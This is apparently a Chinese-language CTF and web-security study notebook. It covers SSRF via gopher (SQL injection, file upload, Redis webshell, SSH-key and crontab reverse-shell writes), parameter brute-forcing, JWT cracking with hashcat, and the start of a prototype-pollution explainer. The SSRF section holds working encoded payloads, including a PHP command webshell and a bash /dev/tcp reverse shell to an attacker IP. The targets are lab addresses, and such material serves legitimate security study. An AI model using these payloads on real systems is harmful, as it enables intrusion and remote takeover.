0%64%25%30%61

POST /shell.php HTTP/1.1
Host: 172.72.23.22
Content-Length: 9
Content-Type: application/x-www-form-urlencoded

cmd=id;ls

```

![image-20240423184335878](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240423184335878.png)

## 6. SSRF 之SQL注入

```
url=gopher://172.72.23.23:80/_%25%34%37%25%34%35%25%35%34%25%32%30%25%32%66%25%33%66%25%36%39%25%36%34%25%33%64%25%32%64%25%33%31%25%32%37%25%32%62%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%62%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%62%25%36%34%25%36%31%25%37%34%25%36%31%25%36%32%25%36%31%25%37%33%25%36%35%25%32%38%25%32%39%25%32%63%25%33%32%25%32%63%25%37%36%25%36%35%25%37%32%25%37%33%25%36%39%25%36%66%25%36%65%25%32%38%25%32%39%25%32%63%25%37%35%25%37%33%25%36%35%25%37%32%25%32%38%25%32%39%25%32%35%25%33%32%25%33%33%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%37%25%33%32%25%32%65%25%33%37%25%33%32%25%32%65%25%33%32%25%33%33%25%32%65%25%33%32%25%33%33%25%30%64%25%30%61

url=gopher://172.72.23.23:80/_GET /?id=-1'+union+select+database(),2,version(),user()%23 HTTP/1.1
Host: 172.72.23.23

```

![image-20240423191711540](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240423191711540.png)

## 7. SSRF 之文件上传

### `multipart/form-data`的定义

媒体类型`multipart/form-data`遵循`multipart MIME`数据流定义（该定义可以参考Section 5.1 - RFC2046）

大概含义就是：媒体类型`multipart/form-data`的数据体由多个部分组成，这些部分有一个固定边界值（Boundary）分割（Boundary 就是分隔符）

```
POST /upload.php HTTP/1.1
Host: 172.72.23.22
Content-Length: 192
Content-Type: multipart/form-data;boundary=benben			# benben 就是boundary

--benben													# --boundary 开头
Content-Disposition: form-data; name="file"; filename="phpinfo.php"
Content-Type: image/jpeg

<?php phpinfo();?>
--benben
Content-Disposition: form-data; name="submit";

上传
--benben--													# --boundary-- 结束
```



```
url=gopher://172.72.23.22:80/_%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%37%35%25%37%30%25%36%63%25%36%66%25%36%31%25%36%34%25%32%65%25%37%30%25%36%38%25%37%30%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%37%25%33%32%25%32%65%25%33%37%25%33%32%25%32%65%25%33%32%25%33%33%25%32%65%25%33%32%25%33%32%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%31%25%33%39%25%33%32%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%64%25%37%35%25%36%63%25%37%34%25%36%39%25%37%30%25%36%31%25%37%32%25%37%34%25%32%66%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%36%34%25%36%31%25%37%34%25%36%31%25%33%62%25%36%32%25%36%66%25%37%35%25%36%65%25%36%34%25%36%31%25%37%32%25%37%39%25%33%64%25%36%32%25%36%35%25%36%65%25%36%32%25%36%35%25%36%65%25%30%64%25%30%61%25%30%64%25%30%61%25%32%64%25%32%64%25%36%32%25%36%35%25%36%65%25%36%32%25%36%35%25%36%65%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%34%25%36%39%25%37%33%25%37%30%25%36%66%25%37%33%25%36%39%25%37%34%25%36%39%25%36%66%25%36%65%25%33%61%25%32%30%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%36%34%25%36%31%25%37%34%25%36%31%25%33%62%25%32%30%25%36%65%25%36%31%25%36%64%25%36%35%25%33%64%25%32%32%25%36%36%25%36%39%25%36%63%25%36%35%25%32%32%25%33%62%25%32%30%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%33%64%25%32%32%25%37%30%25%36%38%25%37%30%25%36%39%25%36%65%25%36%36%25%36%66%25%32%65%25%37%30%25%36%38%25%37%30%25%32%32%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%39%25%36%64%25%36%31%25%36%37%25%36%35%25%32%66%25%36%61%25%37%30%25%36%35%25%36%37%25%30%64%25%30%61%25%30%64%25%30%61%25%33%63%25%33%66%25%37%30%25%36%38%25%37%30%25%32%30%25%37%30%25%36%38%25%37%30%25%36%39%25%36%65%25%36%36%25%36%66%25%32%38%25%32%39%25%33%62%25%33%66%25%33%65%25%30%64%25%30%61%25%32%64%25%32%64%25%36%32%25%36%35%25%36%65%25%36%32%25%36%35%25%36%65%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%34%25%36%39%25%37%33%25%37%30%25%36%66%25%37%33%25%36%39%25%37%34%25%36%39%25%36%66%25%36%65%25%33%61%25%32%30%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%36%34%25%36%31%25%37%34%25%36%31%25%33%62%25%32%30%25%36%65%25%36%31%25%36%64%25%36%35%25%33%64%25%32%32%25%37%33%25%37%35%25%36%32%25%36%64%25%36%39%25%37%34%25%32%32%25%33%62%25%30%64%25%30%61%25%30%64%25%30%61%25%30%61%25%32%30%25%30%64%25%30%61%25%32%64%25%32%64%25%36%32%25%36%35%25%36%65%25%36%32%25%36%35%25%36%65%25%32%64%25%32%64

url=gopher://172.72.23.22:80/_POST /upload.php HTTP/1.1
Host: 172.72.23.22
Content-Length: 192
Content-Type: multipart/form-data;boundary=benben

--benben
Content-Disposition: form-data; name="file"; filename="phpinfo.php"
Content-Type: image/jpeg

<?php phpinfo();?>
--benben
Content-Disposition: form-data; name="submit";


 
--benben--
```

![image-20240423194046678](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240423194046678.png)

## 8. SSRF 之Redis未授权Webshell写入

### 8.1 手动抓包

这里由于我直接用的是国光老师的SSRF靶场，会跟橙子老师那边的不一样，所以需要先在redis的Docker上先用`yum update`更新源，然后把`tcpdump`下载下来

首先先起一个窗口，进入`Redis`的Docker开启抓包

```shell
[root@fe1de086f482 /]# tcpdump -i lo  -w redis.pcapng
tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
^C353 packets captured
```

再起一个窗口，再次进入`Redis`模拟文件写入抓取流量

```shell
[root@fe1de086f482 /]# redis-cli -h 127.0.0.1
127.0.0.1:6379> config set dir /var/www/html				# 设置 web 路径
OK
127.0.0.1:6379> config set dbfilename phpinfo().php			# 设置 shell 文件名
OK
127.0.0.1:6379> set payload "<?php phpinfo();?>"			# 向数据库插入Payload
OK
127.0.0.1:6379> save										# 保存 webshell
OK
127.0.0.1:6379> quit
```

做完之后回到第一个窗口`Ctrl+C`停止抓包并将文件从Docker里面拷贝出来

```shell
# docker cp 容器ID:容器文件路径 宿主机文件路径

┌──(root㉿kali)-[/home/kali]
└─# docker cp fe1de086f482:/radis.pcapng ./
```

用Wireshark打开，将Redis数据拷贝出来，这里红色是我发送的，蓝色是我接收的，这里只过滤出我发送的

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240423205441997.png" alt="image-20240423205441997" style="zoom:67%;" />

![image-20240423205517087](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240423205517087.png)

使用`notepad++`将换行符换位`%0d%0a`，最后得到的数据如下

```
*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$13%0d%0aphpinfo().php%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$7%0d%0apayload%0d%0a$18%0d%0a<%3fphp phpinfo();%3f>%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a


# 这里是要发送的内容
gopher://172.72.23.27:6379/_*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$13%0d%0aphpinfo().php%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$7%0d%0apayload%0d%0a$18%0d%0a<%3fphp phpinfo();%3f>%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
```

![image-20240423205629310](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240423205629310.png)

写入成功！

![image-20240423205641412](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240423205641412.png)

### 8.2 工具自动

使用`Gopherus`直接生成payload，这个工具Github上可以下载

```shell
┌──(root㉿kali)-[/home/…/ctfTool/web/SSRF/Gopherus]
└─# python2 gopherus.py --exploit redis

What do you want?? (ReverseShell/PHPShell): PHPShell
Give web root location of server (default is /var/www/html):                                             
Give PHP Payload (We have default PHP Shell): 
Your gopher link is Ready to get PHP Shell:                                                                                                                                                                                                                            
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A

When it's done you can get PHP Shell in /shell.php at the server with `cmd` as parmeter. 

-----------Made-by-SpyD3r-----------
```

将生成的`payload`的IP地址改为目标IP地址即可，成功后会在`/var/www/html`上插入一句话木马

## 9. SSRF 之Redis未授权SSH公钥写入

本地生成RSA密钥对

```shell
┌──(root㉿kali)-[~]
└─# ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:xGWFKV1oTTVPgfLz9DHB5uNxhRomr/BTSs/a12jEJAY root@kali
The key's randomart image is:
+---[RSA 3072]----+
|         .oO+.=oo|
|       ..oE.+..B.|
|        oo =ooo +|
|       .. . *o.B.|
|        S+ B += B|
|          = o oo.|
|           + . o |
|          . . + .|
|             o   |
+----[SHA256]-----+

```

按上面的方法抓取Redist写入数据，并修改

```
*4
$6
config
$3
set
$3
dir
$11
/root/.ssh/
*4
$6
config
$3
set
$10
dbfilename
$15
authorized_keys
*3
$3
set
$7
payload
$566			# 注意这里有4个换行，一个换行算一位长度；下面是RSA公钥


ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDaJH/sHEHZasm3pA3RRnPUeV+P2i6mRLtyunRI+5s7RgWxu9M7IFSFeF0LkBssyJ+htrsJUsLrxZXU+MddLjjYlU7Y1a2Q8wOHNBseQje1L8Vi+Elofr9jku+RfFnzJFIRp/pLyYIkeIBSxEPvJeZWAgUgcM9ypDRGfW88xgSf62ssTKuGtv/FgLrHIFLcbVxXz51AvjHQsRmX7zzyi9qkb/mPlg9d5669UT7vTuao517M3y6S62wD4WjIPpQ0Q6n7j4aXZEVmbNp+SPkiVg1QFV5P66oEetl9MG/NJCPtyFyjBKNKcJRQtsBrGgTYuEug2xdrRrQdhI/mtpA4RjXZP8X66B+jjvDZviPB8VrUCjznSfji1TU2HBwSmfMm4mjM//eD1Mv95QL6bi7urrqFkTYue/pDF2z/P3TE8aslR8coyF9DqQDYteY16e0CS/atUpHFFDKwW+fKesOK0MmXoCANB4jgHIroXvFxrk2Eh1ggW5Y7r0HfNkNQKDwwfMM= root@kali


*1
$4
save
*1
$4
quit
```

将回车替换为`%0d0a`

```
*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$7%0d%0apayload%0d%0a$566%0d%0a%0d%0a%0d%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDaJH/sHEHZasm3pA3RRnPUeV+P2i6mRLtyunRI+5s7RgWxu9M7IFSFeF0LkBssyJ+htrsJUsLrxZXU+MddLjjYlU7Y1a2Q8wOHNBseQje1L8Vi+Elofr9jku+RfFnzJFIRp/pLyYIkeIBSxEPvJeZWAgUgcM9ypDRGfW88xgSf62ssTKuGtv/FgLrHIFLcbVxXz51AvjHQsRmX7zzyi9qkb/mPlg9d5669UT7vTuao517M3y6S62wD4WjIPpQ0Q6n7j4aXZEVmbNp+SPkiVg1QFV5P66oEetl9MG/NJCPtyFyjBKNKcJRQtsBrGgTYuEug2xdrRrQdhI/mtpA4RjXZP8X66B+jjvDZviPB8VrUCjznSfji1TU2HBwSmfMm4mjM//eD1Mv95QL6bi7urrqFkTYue/pDF2z/P3TE8aslR8coyF9DqQDYteY16e0CS/atUpHFFDKwW+fKesOK0MmXoCANB4jgHIroXvFxrk2Eh1ggW5Y7r0HfNkNQKDwwfMM= root@kali%0d%0a%0d%0a%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit


# 最后提交的数据
gopher://172.72.23.27:6379/_*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$7%0d%0apayload%0d%0a$566%0d%0a%0d%0a%0d%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDaJH/sHEHZasm3pA3RRnPUeV+P2i6mRLtyunRI+5s7RgWxu9M7IFSFeF0LkBssyJ+htrsJUsLrxZXU+MddLjjYlU7Y1a2Q8wOHNBseQje1L8Vi+Elofr9jku+RfFnzJFIRp/pLyYIkeIBSxEPvJeZWAgUgcM9ypDRGfW88xgSf62ssTKuGtv/FgLrHIFLcbVxXz51AvjHQsRmX7zzyi9qkb/mPlg9d5669UT7vTuao517M3y6S62wD4WjIPpQ0Q6n7j4aXZEVmbNp+SPkiVg1QFV5P66oEetl9MG/NJCPtyFyjBKNKcJRQtsBrGgTYuEug2xdrRrQdhI/mtpA4RjXZP8X66B+jjvDZviPB8VrUCjznSfji1TU2HBwSmfMm4mjM//eD1Mv95QL6bi7urrqFkTYue/pDF2z/P3TE8aslR8coyF9DqQDYteY16e0CS/atUpHFFDKwW+fKesOK0MmXoCANB4jgHIroXvFxrk2Eh1ggW5Y7r0HfNkNQKDwwfMM= root@kali%0d%0a%0d%0a%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit
```

### 10. SSRF 之Redis未授权计划任务Shell反弹

首先用`gopherus`生成payload

```
┌──(root㉿kali)-[/home/…/ctfTool/web/SSRF/Gopherus]
└─# python2 gopherus.py --exploit redis                                                                 
Ready To get SHELL
What do you want?? (ReverseShell/PHPShell): ReverShell
Give your IP Address to connect with victim through Revershell (default is 127.0.0.1): 192.168.231.153   
What can be his Crontab Directory location
## For debugging(locally) you can use /var/lib/redis :                                                   
Your gopher link is ready to get Reverse Shell:                                                                                                                                                                                  
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2470%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/192.168.231.153/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A

Before sending request plz do `nc -lvp 1234`

-----------Made-by-SpyD3r-----------
```

将IP地址改成Redis服务器的IP地址即可，nc监听webshell回弹，可以看到webshell被成功写入到`/var/spool/cron`中

![image-20240423222044436](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240423222044436.png)

![image-20240423222129202](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240423222129202.png)







# 参数爆破

> Arjun工具地址：https://github.com/s0md3v/Arjun
>
> kali安装：apt get install arjun

在做CTF题的时候，遇到没有头绪的题目通常会尝试做目录爆破，如果目录爆破没有结果，那么就会尝试使用`Arjun`做一个URL参数爆破

**Scan a single URL**

Option: `-u`

Run Arjun against a single URL.

```
arjun -u https://api.example.com/endpoint
```

**Specify HTTP method**

Option: `-m`

Arjun looks for `GET` method parameters by default. All available methods are: `GET/POST/JSON/XML`

```
arjun -u https://api.example.com/endpoint -m POST
```

## [RootersCTF2019]I_<3_Flask

进入发现没有任何的线索和提示，扫描目录也没有任何结果

![image-20240222002341235](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240222002341235.png)

尝试做参数爆破，发现`name`参数，如下：

`-d`：5秒延迟

![image-20240222002440375](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240222002440375.png)

![image-20240222002509629](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240222002509629.png)

# JWT 漏洞

> 参考：
>
> ​		笔记：http://www.farmsec.com/book/read/56
>
> ​		视频：https://www.bilibili.com/video/BV1VK411Q7hP/?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=05abd235c4d932713bb7910dfa6ba067
>
> 

## 1. 什么是JWT

Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。

**token的认证和传统的session认证的区别**

***传统的session认证：***

我们知道，http协议本身是一种无状态的协议，而这就意味着如果用户向我们的应用提供了用户名和密码来进行用户认证，那么下一次请求时，用户还要再一次进行用户认证才行，因为根据http协议，我们并不能知道是哪个用户发出的请求，所以为了让我们的应用能识别是哪个用户发出的请求，我们只能在服务器存储一份用户登录的信息，这份登录信息会在响应时传递给浏览器，告诉其保存为cookie,以便下次请求时发送给我们的应用，这样我们的应用就能识别请求来自哪个用户了,这就是传统的基于session认证。

但是这种基于session的认证使应用本身很难得到扩展，随着不同客户端用户的增加，独立的服务器已无法承载更多的用户，而这时候基于session认证应用的问题就会暴露出来。

**基于session认证所显露的问题：**

**Session:** 每个用户经过我们的应用认证之后，我们的应用都要在服务端做一次记录，以方便用户下次请求的鉴别，通常而言session都是保存在内存中，而随着认证用户的增多，服务端的开销会明显增大。

**扩展性:** 用户认证之后，服务端做认证记录，如果认证的记录被保存在内存中的话，这意味着用户下次请求还必须要请求在这台服务器上,这样才能拿到授权的资源，这样在分布式的应用上，相应的限制了负载均衡器的能力。这也意味着限制了应用的扩展能力。

**CSRF:** 因为是基于cookie来进行用户识别的, cookie如果被截获，用户就会很容易受到跨站请求伪造的攻击。

***基于token的鉴权机制：***基于token的鉴权机制类似于http协议也是无状态的，它不需要在服务端去保留用户的认证信息或者会话信息。这就意味着基于token认证机制的应用不需要去考虑用户在哪一台服务器登录了，这就为应用的扩展提供了便利。

**总结：**Session的主要问题是每个用户的认证都需要在服务器上留下一个文件，随着用户的越来越多，服务器的压力就越来越大；而JWT直接把身份令牌保存在客户端中，服务器只需要保存一个密钥即可~

## 2. JWT认证过程

**传统的 session 流程**

1. 浏览器发起请求登陆
2. 服务端验证身份，生成**身份验证信息**，存储在服务端，并且告诉浏览器写入 Cookie
3. 浏览器发起请求获取用户资料，此时 Cookie 内容也跟随这发送到服务器
4. 服务器发现 Cookie 中有身份信息，验明正身
5. 服务器返回该用户的用户资料

**JWT 流程**

1. 浏览器发起请求登陆
2. 服务端验证身份，根据算法，将用户标识符打包生成 token, 并且返回给浏览器
3. 浏览器发起请求获取用户资料，把刚刚拿到的 token 一起发送给服务器
4. 服务器发现数据中有 token，验明正身
5. 服务器返回该用户的用户资料

![image-20221014150033973](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20221014150033973.png)

## 3. JWT格式

JWT是由三段信息构成的，将这三段信息文本用.链接一起就构成了Jwt字符串。就像这样：

```
eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA
```

第一部分我们称它为头部（header)

第二部分我们称其为载荷（payload)

第三部分是签证（signature)

**header部分承载两部分信息：**

声明类型，这里是jwt

声明加密的算法 通常直接使用 HMAC SHA256

完整的头部就像下面这样的JSON：

```
{"kid":"9136ddb3-cb0a-4a19-a07e-eadf5a44c8b5","alg":"RS256"}
```

将header进行base64加密（该加密是可以对称解密的),构成了第一部分。**`alg`**是哈希算法

**payload是存放有效信息的地方，这些有效信息包含三个部分：**

```
标准中注册的声明
公共的声明
私有的声明
```

标准中注册的声明 (建议但不强制使用) ：

```
iss: jwt签发者。
sub: jwt所面向的用户。
aud: 接收jwt的一方。
exp: jwt的过期时间，这个过期时间必须要大于签发时间。
nbf: 定义在什么时间之前，该jwt都是不可用的。
iat: jwt的签发时间。
jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。
```

公共的声明 ：

公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加敏感信息，因为该部分在客户端可解密。

私有的声明 ：

私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息，因为base64是对称解密的，意味着该部分信息可以归类为明文信息。

定义一个payload:

```
{"iss":"portswigger","exp":1648037164,"name":"Carlos Montoya","sub":"carlos","role":"blog_author","email":"carlos@carlos-montoya.net","iat":1516239022}
```

将payload进行base64加密，构成了第二部分。

**signature是一个签证信息，这个签证信息由三部分组成：**

```
header (base64后的)
payload (base64后的)
secret
这个部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密，然后就构成了jwt的第三部分。
```

发出令牌的服务器通常通过哈希头和有效负载来生成签名。在某些情况下，它们还对生成的哈希进行加密。

无论哪种方式，此过程都涉及一个秘密签名密钥。此机制为服务器提供了一种方法，用于验证令牌内的数据自发布以来未被篡改：

由于签名直接来自令牌的其余部分，因此更改头或负载的单个字节会导致签名不匹配。

如果不知道服务器的秘密签名密钥，就不可能为给定的头或负载生成正确的签名。

## 4. JWT原理总结

JWT主要根据header确定加密算法，payload保存用户信息，服务器在收到一段JWT后，会根据自己的**密钥**和算法哈希计算这段JWT，并拿着这串哈希用用户的JWT`signature`做比较，对得上则通过，否则失败；那么只要黑客拿到密钥就成功破解了JWT

这里的主要漏洞是：

1. 黑客可以尝试通过密钥的爆破做到JWT伪造
2. JWT自身有漏洞（未研究）

## 4. jwt的转换

我们可以通过jwt.io(https://jwt.io/) 进行jwt的编码转换

![image-20221014160024860](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20221014160024860.png)

而当我们将生成的JWT重新复制回页面后，会发现由于secret的错误导致invalid signature。

![image-20221014160119331](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20221014160119331.png)

或者我们可以这样理解JWT：

```
JWT相当于一张电影票
电影院的工作人员会通过电影票的防伪措施进行判定，如果为真则可以看电影：）
而站在攻击者的角度则会变成如果进行高仿真的造价，亦或者说能否搞到打印电影票的打印机。
```

附录：可以使用jwt的命令：

```
apt-get install jwt
jwt -show aaa
```

![image-20221014163025179](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20221014163025179.png)

## 5. Brute-forcing secret keys

我们可以通过hastcat工具针对JWT的secret key进行暴力破解。

我们可以通过如下的命令方式进行破解：

```
hashcat -a 0 -m 16500 <jwt.txt> <wordlist>
测试成功后，可以通过--show的参数进行展示
```

测试的key内容如下：

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJmYXJtc2VjIiwibmFtZSI6IlRRIiwiaWF0IjoxODg4ODg4ODg4OH0.NBlmhXhuEj64iLOb9dCKozDcZYYpcMJrsdDUVjadAEg
hashcat -a 0 -m 16500 jwt.txt pass.txt
hashcat -a 0 -m 16500 jwt.txt pass.txt --show
```

![image-20221014161651509](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20221014161651509.png)

![image-20221014161734754](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20221014161734754.png)

现教案有个bug待解决：

```
当通过jwt.io进行编码时，如果选择secret base64 encoded，那么爆破不成功。
现未确定问题出在哪？学会了教我~
```

## 6. jwt的靶场

靶场一：burpsuite

https://portswigger.net/web-security/jwt

靶场二：webgoat

```
Github：
https://github.com/WebGoat/WebGoat

为了方便，这里直接用docker来做测试
docker search webgoat
docker pull webgoat/webgoat-8.0:v8.1.0
docker pull webgoat/webwolf:v8.1.0
docker pull webgoat/goatandwolf:v8.1.0
docker images
docker run -d -p 8888:8888 -p 8080:8080 -p 9090:9090 webgoat/goatandwolf:v8.1.0
```

# JS 原型链污染

## 1. `prototype` 和 `__proto__` 分别是什么

JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：

```javascript
function Foo() {
    this.bar = 1
}

new Foo()
```

`Foo`函数的内容，就是`Foo`类的构造函数，而`this.bar`就是`Foo`类的一个属性。

一个类必然有一些方法，类似属性`this.bar`，我们也可以将方法定义在构造函数内部：

```javascript
function Foo() {
    this.bar = 1
    this.show = function() {
        console.log(this.bar)
    }
}

(new Foo()).show()
```

但这样写有一个问题，就是每当我们新建一个Foo对象时，`this.show = function...`就会执行一次，这个`show`方法实际上是绑定在对象上的，而不是绑定在“类”中。（即每新建一个Foo对象，就会重新开辟一块内存空间来创建`this.show`，将`this.show`定义为函数）

值得一提的是，虽然我们使用`this.show = function...`来创建`this.show`，但这里的`function`内容并不会被执行，仅仅只是将`this.show`定义为一个函数而已

我希望在创建类的时候只创建一次`show`方法，这时候就则需要使用原型（prototype）了：

```javascript
function Foo() {
    this.bar = 1;
}

Foo.prototype.show = function() {
    console.log(this.bar);
};

const foo1 = new Foo();
const foo2 = new Foo();

foo1.show(); // 输出 1
foo2.show(); // 输出 1
```


你提到的关于每次创建一个 `Foo` 对象时，`this.show` 方法会重新定义一次，这个观点是正确的。我们深入解释一下其中的原因，以及如何优化它。

**构造函数内部定义方法的情况**

```
javascript复制代码function Foo() {
    this.bar = 1;
    this.show = function() {
        console.log(this.bar);
    };
}

const foo1 = new Foo();
const foo2 = new Foo();

foo1.show(); // 输出 1
foo2.show(); // 输出 1
```

在这种方式下，每次调用 `new Foo()` 时，`this.show` 都会被重新定义一次。具体来说：

1. 当 `new Foo()` 被调用时，JavaScript 创建一个新的空对象，并将其赋值给 `this`。
2. `this.bar = 1` 设置 `bar` 属性为 1。
